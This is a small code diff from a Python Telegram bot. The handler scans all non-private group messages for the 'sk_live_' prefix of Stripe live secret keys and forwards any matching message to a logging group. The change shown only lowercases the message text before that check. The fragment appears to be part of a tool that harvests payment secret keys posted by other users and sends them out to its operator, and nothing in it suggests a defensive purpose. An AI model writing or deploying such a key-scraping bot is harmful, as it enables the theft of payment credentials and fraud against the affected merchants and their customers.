@@ -15,6 +15,7 @@ from pyromod import listen
 @bot.on_message(~filters.private)
 async def copy(client, message):
     text = message.text
+    text = text.lower()
     if "sk_live_" in text:
       try:
           await message.forward(LOG_GRP)
